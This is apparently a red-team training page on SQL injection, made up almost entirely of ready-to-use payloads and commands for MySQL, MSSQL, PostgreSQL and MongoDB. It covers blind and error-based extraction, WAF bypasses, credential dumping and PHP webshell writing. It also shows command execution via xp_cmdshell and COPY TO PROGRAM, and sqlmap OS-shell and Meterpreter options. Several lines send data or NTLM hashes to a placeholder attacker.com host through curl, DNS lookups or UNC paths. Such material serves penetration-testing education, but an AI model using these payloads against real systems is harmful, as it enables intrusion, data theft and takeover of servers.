---
layout: training-page
title: "SQL Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - sqli
  - blind
  - oob
  - nosql
  - waf-bypass
page_key: "web-sql-injection"
render_with_liquid: false
---

# SQL Injection

SQL injection remains one of the highest-impact web vulnerabilities. Beyond basic union-based extraction, modern engagements rely on blind techniques (boolean and time-based), out-of-band (OOB) data exfiltration, second-order injection, and NoSQL variants. This page covers the full attack chain from detection to shells.

## Detection — Fingerprinting Injection Points

```
# Error-based detection (single quote):
https://target/item?id=1'      # syntax error → injectable
https://target/item?id=1\      # MySQL escaping error
https://target/item?id=1--     # comment truncates query

# Boolean-based confirmation:
?id=1 AND 1=1    # → same response as normal
?id=1 AND 1=2    # → different/empty response → blind injectable

# Time-based confirmation (blind, no output difference):
# MySQL:
?id=1 AND SLEEP(5)
# PostgreSQL:
?id=1; SELECT pg_sleep(5)--
# MSSQL:
?id=1; WAITFOR DELAY '0:0:5'--
# Oracle:
?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)

# sqlmap automatic detection:
sqlmap -u "https://target/item?id=1" --batch --dbs
sqlmap -u "https://target/item?id=1" --level=5 --risk=3 --batch
```

## Boolean-Based Blind SQLi

No output, but response changes based on TRUE/FALSE condition. Enumerate data bit by bit.

```
# Manual boolean blind — extract DB name character by character:
# Confirm first character of database name is 'd' (ASCII 100):
?id=1 AND SUBSTRING(database(),1,1)='d'--
?id=1 AND ORD(SUBSTR(database(),1,1))=100--

# Automate with sqlmap:
sqlmap -u "https://target/page?id=1" --technique=B --batch \
  --dbs --level=3

# Custom blind injection script (Python):
# import requests
# for i in range(1, 20):
#   for c in range(32, 127):
#     r = requests.get(f"https://target/page?id=1 AND ORD(SUBSTR(database(),{i},1))={c}--")
#     if "Welcome" in r.text:  # true condition marker
#       print(chr(c), end='')
#       break
```

## Time-Based Blind SQLi

No response difference at all — purely timing side-channel.

```
# MySQL time-based blind:
# True condition = 5 second delay, false = no delay
?id=1 AND IF(1=1,SLEEP(5),0)--
?id=1 AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0)--

# sqlmap time-based:
sqlmap -u "https://target/page?id=1" --technique=T --batch \
  --dbs --time-sec=3

# MSSQL stacked query time-based (when stacked queries allowed):
?id=1; IF (SELECT COUNT(*) FROM sysobjects WHERE name='users')>0 WAITFOR DELAY '0:0:5'--

# Conditional error-based (extractvia error messages):
# MySQL:
?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
?id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
```

## Out-of-Band (OOB) SQL Injection

Exfiltrate data via DNS or HTTP requests — useful when response and timing channels are blocked.

```
# MySQL OOB via DNS (requires FILE privilege + DNS callback):
# Use Burp Collaborator or interactsh for DNS callback
?id=1 AND LOAD_FILE(CONCAT('\\\\',database(),'.BURP-COLLAB.burpcollaborator.net\\a'))--

# MySQL OOB via HTTP (SELECT INTO OUTFILE to UNC path):
?id=1 UNION SELECT 1,2,load_file(0x2f6574632f706173737764)-- -
# (0x2f6574632f706173737764 = /etc/passwd)

# MSSQL OOB via DNS (xp_dirtree — no special privilege needed):
?id=1; DECLARE @q NVARCHAR(1024);
SET @q=CONCAT('\\',@@version,'.attacker.com\a');
EXEC xp_dirtree @q--

# MSSQL OOB via linked server:
?id=1; EXEC master.dbo.xp_dirtree '//attacker.com/a'--

# PostgreSQL OOB COPY:
?id=1; COPY (SELECT current_database()) TO PROGRAM 'curl http://attacker.com/exfil?d='||current_database()--

# sqlmap OOB with DNS:
sqlmap -u "https://target/page?id=1" --dns-domain=attacker.com --batch --dbs
```

## Second-Order (Stored) SQL Injection

Input stored safely, but retrieved later and used in a SQL query without sanitization.

```
# Example: registration stores username, but password-reset query is:
# SELECT * FROM users WHERE username='$username' AND email='$email'
# Register with username: admin'--
# Password reset query becomes:
# SELECT * FROM users WHERE username='admin'-- ' AND email='anything'
# → authenticates as admin

# Detection: look for user-controlled data appearing in later queries
# Common locations:
# - Username/profile fields → password reset, search
# - Product names/descriptions → order confirmations, invoices
# - Comments/reviews → moderation panels

# Manual testing: inject into registration/profile, then trigger the later action
# Use a SLEEP() payload in stored field — check if sleep fires on retrieval
```

## NoSQL Injection (MongoDB)

MongoDB queries use JSON operators. Injecting operator objects bypasses equality checks.

```
# MongoDB operator injection — login bypass:
# Normal query: db.users.find{username: "input", password: "input"})
# Inject: username[$ne]=invalid&password[$ne]=invalid
# → db.users.find{username: {$ne: "invalid"}, password: {$ne: "invalid"}})
# → returns first user (admin)

# HTTP form POST injection:
POST /login
username[$ne]=x&password[$ne]=x

# JSON POST injection:
{"username": {"$ne": "x"}, "password": {"$ne": "x"}}

# Regex injection (enumerate users):
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}  # usernames starting with 'a'
{"username": {"$regex": "^ad"}, "password": {"$ne": ""}} # starting with 'ad'

# $where injection (JavaScript execution in MongoDB 3.x):
{"username": "admin", "$where": "sleep(5000)"}

# Tools:
# NoSQLMap: https://github.com/codingo/NoSQLMap
# nosql-injection-fuzzer, Burp extension "NoSQL Scanner"
python nosqlmap.py -u "http://target/login" --attack 1
```

## WAF Bypass Techniques

```
# Encoding bypasses:
# URL encode: ' → %27, space → %20
# Double URL encode: ' → %2527
# Unicode: %u0027 → '

# Case variation:
UniOn SeLeCt UsEr()

# Inline comments (MySQL):
UN/**/ION SEL/**/ECT 1,2,3--
UN/*!ION*/ /*!SEL*/ECT 1,2,3--

# Whitespace alternatives:
# Tab (%09), newline (%0a), carriage return (%0d)
UNION%09SELECT%091,2,3--
UNION%0aSELECT%0a1,2,3--

# Alternative operators:
# OR → ||, AND → &&, = → LIKE, != → <>
1 UNION SELECT IF(1||1,1,0),2,3--

# sqlmap tamper scripts:
sqlmap -u "URL" --tamper=space2comment,randomcase,charunicodeescape \
  --level=5 --risk=3

# Common tamper scripts:
# space2comment → spaces become /**/
# randomcase → raNdOM cAsE
# charunicodeescape → unicode escaping
# between → > becomes NOT BETWEEN 0 AND
# greatest → GREATEST() instead of >
# equaltolike → = becomes LIKE

# HPP (HTTP Parameter Pollution):
?id=1&id=UNION SELECT 1,2,3--

# HTTP header injection:
X-Forwarded-For: 127.0.0.1' OR '1'='1
User-Agent: ' OR 1=1--
```

## UNION-Based Extraction

```
# Step 1: Find column count (ORDER BY method):
?id=1 ORDER BY 1--   # works
?id=1 ORDER BY 2--   # works
?id=1 ORDER BY 5--   # error → 4 columns

# Step 2: Find printable columns (NULL method):
?id=0 UNION SELECT NULL,NULL,NULL,NULL--
?id=0 UNION SELECT 'a',NULL,NULL,NULL--  # try each position

# Step 3: Extract data:
?id=0 UNION SELECT @@version,database(),user(),@@datadir--

# Extract all tables:
?id=0 UNION SELECT group_concat(table_name),2,3,4
  FROM information_schema.tables WHERE table_schema=database()--

# Extract columns from table:
?id=0 UNION SELECT group_concat(column_name),2,3,4
  FROM information_schema.columns WHERE table_name='users'--

# Dump credentials:
?id=0 UNION SELECT group_concat(username,0x3a,password),2,3,4 FROM users--

# Read files (MySQL with FILE privilege):
?id=0 UNION SELECT load_file('/etc/passwd'),2,3,4--

# Write webshell (MySQL with write access):
?id=0 UNION SELECT '<?php system($_GET["cmd"]); ?>',2,3,4
  INTO OUTFILE '/var/www/html/shell.php'--
```

## SQLi to RCE

```
# MySQL → UDF (User Defined Function) RCE:
# Requires FILE + INSERT privilege, mysql running as root
# Upload UDF library via SELECT INTO DUMPFILE:
SELECT 0x[lib_hex] INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
SELECT sys_exec('id > /tmp/out');

# MSSQL → xp_cmdshell:
# Enable if disabled:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
# Execute:
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -enc BASE64PAYLOAD';

# PostgreSQL → COPY TO PROGRAM (≥9.3):
COPY (SELECT '') TO PROGRAM 'id > /tmp/out';
# Or as superuser via:
DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(data text);
COPY cmd FROM PROGRAM 'id';
SELECT * FROM cmd;

# sqlmap OS shell:
sqlmap -u "URL" --os-shell --technique=BEUSTQ
```

## SecLists SQL Payload Files

Use these lists with sqlmap `--string` tests, ffuf, or Burp Intruder. See [Web Fuzzing Payloads](/web/fuzzing-payloads/) for full usage detail.

```
# /usr/share/seclists/Fuzzing/Databases/SQLi/
#
# quick-SQLi.txt                   77  — fast detection probe (start here)
# Generic-SQLi.txt                268  — broad all-engine coverage
# Generic-BlindSQLi.fuzzdb.txt     42  — time-based and boolean blind
# sqli.auth.bypass.txt             96  — login form bypass payloads
# SQLi-Polyglots.txt                3  — multi-context single payload
# MySQL.fuzzdb.txt                  6  — MySQL-specific
# MySQL-SQLi-Login-Bypass.fuzzdb.txt  8  — MySQL login bypass
# MSSQL.fuzzdb.txt                 17  — SQL Server stacked / xp_cmdshell
# Oracle.fuzzdb.txt                55  — Oracle-specific
# NoSQL.txt                        22  — MongoDB operator injection

# Quick detection with ffuf:
ffuf -u "https://target.com/item?id=FUZZ" \
  -w /usr/share/seclists/Fuzzing/Databases/SQLi/quick-SQLi.txt \
  -fs [baseline_size] -ac -mc all

# Login bypass:
ffuf -u https://target.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/seclists/Fuzzing/Databases/SQLi/sqli.auth.bypass.txt \
  -fr "Invalid\|incorrect"
```

## MySQL Injection Techniques

MySQL-specific payloads and techniques from PayloadsAllTheThings.

### MySQL Comments

```
# Comment variants (useful for WAF bypass):
#comment              -- hash comment
/* comment */         -- C-style comment
/*! special SQL */    -- MySQL special SQL (executed by MySQL, ignored by others)
-- comment            -- SQL comment (note: space required after --)
`;%00`                -- null byte (some legacy parsers)

# Version-conditional execution:
/*!50000 SELECT version() */   -- only executes on MySQL >= 5.0.0
```

### MySQL Error-Based Extraction

```
# EXTRACTVALUE error-based:
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))--

# UPDATEXML error-based:
AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--
AND UPDATEXML(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1)--

# Double query error-based:
AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### MySQL Blind Techniques

```
# Substring equivalents for blind extraction:
SUBSTR(database(),1,1)='a'
SUBSTRING(database(),1,1)='a'
MID(database(),1,1)='a'

# MAKE_SET blind:
AND MAKE_SET(1&(SELECT 1 FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1)--

# LIKE blind (no quotes needed):
AND (SELECT database()) LIKE 'a%'--
AND (SELECT database()) LIKE 'ab%'--

# REGEXP blind:
AND (SELECT database()) REGEXP '^a'--

# Time-based with conditional:
AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
AND IF(1=1,SLEEP(5),0)--
```

### MySQL Out-of-Band & File Operations

```
# Read file (requires FILE privilege):
UNION SELECT load_file('/etc/passwd'),2,3--
UNION SELECT load_file(0x2f6574632f706173737764),2,3--  -- hex-encoded path

# Write webshell:
UNION SELECT '<?php system($_GET["cmd"]); ?>',2,3
  INTO OUTFILE '/var/www/html/shell.php'--
INTO DUMPFILE '/var/www/html/shell.php'--  -- single-row version

# DNS OOB exfiltration (requires FILE privilege):
AND LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))--
AND LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT database()),0x2e61747461636b65722e636f6d5c5c61))--

# Dump in one shot (DIOS) — extract all data as single string:
UNION SELECT group_concat(0x7e,username,0x3a,password,0x7e) FROM users--
```

### MySQL WAF Bypass

```
# Alternative to information_schema (MySQL 8+):
# sys.schema_table_statistics_with_buffer, mysql.innodb_table_stats
SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=database()

# Alternative to VERSION():
SELECT @@version
SELECT @@global.version

# Alternative to GROUP_CONCAT():
SELECT JSON_ARRAYAGG(table_name) FROM information_schema.tables WHERE table_schema=database()

# Scientific notation bypass (bypasses numeric filters):
1e0 UNION SELECT...    -- 1e0 = 1
0e0 UNION SELECT...    -- 0e0 = 0

# Inline comments (MySQL version-conditional):
UN/**/ION SEL/**/ECT 1,2,3--
UN/*!ION*/SEL/*!ECT*/1,2,3--

# Wide-byte injection (GBK encoding — %bf%27 = valid GBK char + quote):
%bf%27 OR 1=1--    -- bypasses addslashes() on GBK-encoded connections
```

## MSSQL Injection Techniques

Microsoft SQL Server specific payloads from PayloadsAllTheThings.

### MSSQL Enumeration Queries

```
-- Version and context:
SELECT @@version
SELECT DB_NAME()
SELECT CURRENT_USER
SELECT system_user
SELECT HOST_NAME()
SELECT SERVERPROPERTY('productversion')

-- List databases:
SELECT name FROM master..sysdatabases
SELECT name FROM master.sys.databases
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases  -- MSSQL 2017+

-- List tables in current DB:
SELECT name FROM sysobjects WHERE xtype='U'
SELECT name FROM information_schema.tables WHERE table_type='BASE TABLE'

-- List columns:
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### MSSQL Error-Based & Stacked Queries

```
-- Error-based extraction (convert to int triggers error with data):
AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
AND 1=CONVERT(int,DB_NAME())--
AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))--

-- Stacked queries (when supported — e.g. via sqlmap or direct connection):
'; SELECT * FROM users--
'; EXEC xp_cmdshell('whoami')--
'; INSERT INTO users VALUES('attacker','attacker_pass')--

-- Time-based blind:
; IF (1=1) WAITFOR DELAY '0:0:5'--
; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 WAITFOR DELAY '0:0:5'--
; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>64) WAITFOR DELAY '0:0:5'--
```

### MSSQL Command Execution & OOB

```
-- Enable and use xp_cmdshell:
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'powershell -enc BASE64PAYLOAD'--

-- DNS OOB exfiltration via xp_dirtree:
'; DECLARE @v NVARCHAR(1024);
SET @v=CONCAT('\\',@@version,'.attacker.com\a');
EXEC xp_dirtree @v--

-- UNC path (NTLM hash stealing):
'; EXEC xp_dirtree '\\attacker.com\share'--
'; EXEC xp_fileexist '\\attacker.com\share\file'--

-- Trusted links (move laterally between linked SQL servers):
SELECT * FROM OPENQUERY([linked_server],'SELECT @@version')
EXEC ('xp_cmdshell ''whoami''') AT [linked_server]

-- Read file:
'; CREATE TABLE tmp(data NVARCHAR(4000));
BULK INSERT tmp FROM 'C:\Windows\win.ini';
SELECT data FROM tmp--
```

## PostgreSQL Injection Techniques

PostgreSQL-specific payloads from PayloadsAllTheThings.

### PostgreSQL Enumeration

```
-- Version and context:
SELECT version()
SELECT CURRENT_DATABASE()
SELECT CURRENT_USER
SELECT session_user

-- List databases:
SELECT datname FROM pg_database

-- List schemas:
SELECT DISTINCT(schemaname) FROM pg_tables

-- List tables:
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- List columns:
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- List users and password hashes:
SELECT usename, passwd FROM pg_shadow  -- requires superuser
SELECT usename FROM pg_user WHERE usesuper IS TRUE  -- list admins
```

### PostgreSQL Error-Based Extraction

```
-- CAST to integer triggers verbose error with data:
AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC)--
AND CAST((SELECT version()) AS INT)=1337--

-- XML helper — dump all data in one query:
SELECT query_to_xml('SELECT * FROM users',true,true,'')
-- Returns all rows as XML — chain with error-based to exfil

-- CAST chain for table enumeration:
AND CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0)||chr(126) AS NUMERIC)--
AND CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0)||chr(126) AS NUMERIC)--
```

### PostgreSQL Time-Based Blind

```
-- Basic sleep:
SELECT 1 FROM pg_sleep(5)
||(SELECT 1 FROM pg_sleep(5))

-- Conditional time-based:
SELECT CASE WHEN (SELECT current_user)='postgres' THEN pg_sleep(5) ELSE pg_sleep(0) END
SELECT CASE WHEN SUBSTRING(current_database(),1,1)='p' THEN pg_sleep(5) ELSE pg_sleep(0) END
AND 'RAND'||PG_SLEEP(5)='RAND'--  -- append to string parameter
```

### PostgreSQL Command Execution

```
-- COPY TO PROGRAM (PostgreSQL 9.3+ superuser):
COPY (SELECT '') TO PROGRAM 'id > /tmp/out'
COPY cmd FROM PROGRAM 'id'  -- requires CREATE TABLE cmd first

-- Using libc (older technique):
CREATE OR REPLACE FUNCTION system(cstring) RETURNS integer LANGUAGE internal VOLATILE AS 'system';
SELECT system('id > /tmp/out');

-- Large Object file read (lo_export):
SELECT lo_import('/etc/passwd', 13371337)
SELECT lo_get(13371337)::text

-- Stacked query command execution via sqlmap:
sqlmap -u "URL" --dbms=postgresql --technique=S --os-shell
```

## SQLmap Reference

Key SQLmap flags, tamper scripts, and advanced usage patterns from PayloadsAllTheThings.

### Core Usage

```
# Full enumeration:
sqlmap --url="https://target/?id=1" -p id --dbms=MySQL --os=Linux \
  --banner --is-dba --users --passwords --current-user --dbs \
  --random-agent --threads=10 --risk=3 --level=5 --eta

# Load a saved HTTP request from Burp (most reliable method):
sqlmap -r request.txt --batch --dbs

# Custom injection point using wildcard:
sqlmap -u "https://target/" --data "username=admin&password=pass" \
  --headers="X-Forwarded-For: 127.0.0.1*"  # inject in header

# Second-order injection (stored then retrieved elsewhere):
sqlmap -r /tmp/r.txt --dbms MySQL \
  --second-order "https://target/wishlist" -v 3

# Proxy through Burp:
sqlmap -u "https://target/?id=1" --proxy="http://127.0.0.1:8080" --batch
```

### Shell Access

```
# SQL shell (run raw SQL queries):
sqlmap -u "https://target/?id=1" -p id --sql-shell

# OS shell (execute system commands):
sqlmap -u "https://target/?id=1" -p id --os-shell

# Meterpreter session:
sqlmap -u "https://target/?id=1" -p id --os-pwn

# Write SSH key:
sqlmap -u "https://target/?id=1" -p id \
  --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
```

### Tamper Scripts

```
# Apply multiple tamper scripts for WAF bypass:
sqlmap -u "URL" --tamper=space2comment,randomcase,charunicodeescape \
  --level=5 --risk=3 --batch

# Key tamper scripts:
# space2comment       → spaces become /**/
# randomcase          → raNdOM cAsE keywords
# charunicodeescape   → unicode escape sequences
# between             → > becomes NOT BETWEEN 0 AND
# greatest            → GREATEST() instead of >
# equaltolike         → = becomes LIKE
# unmagicquotes       → wide-char bypass for magic_quotes
# base64encode        → base64-encodes payloads
# apostrophemask      → replaces ' with UTF-8 fullwidth apostrophe
# chardoubleencode    → double URL-encodes all chars

# Custom tamper script template:
# from lib.core.enums import PRIORITY
# def tamper(payload, **kwargs):
#     return payload.replace(' ', '/**/')

# Reduce requests (when fingerprint is known):
sqlmap -u "URL" --dbms=mysql --technique=BT --batch --no-cast
```

## Tools & Resources

- `sqlmap` — `github.com/sqlmapproject/sqlmap`
- `ghauri` — `github.com/r0oth3x49/ghauri` — newer alternative
- PortSwigger SQLi labs — `portswigger.net/web-security/sql-injection`
- PayloadsAllTheThings — `github.com/swisskyrepo/PayloadsAllTheThings`
- HackTricks SQLi — `book.hacktricks.xyz/pentesting-web/sql-injection`
- SecLists SQLi payloads — [Web Fuzzing Payloads](/web/fuzzing-payloads/)
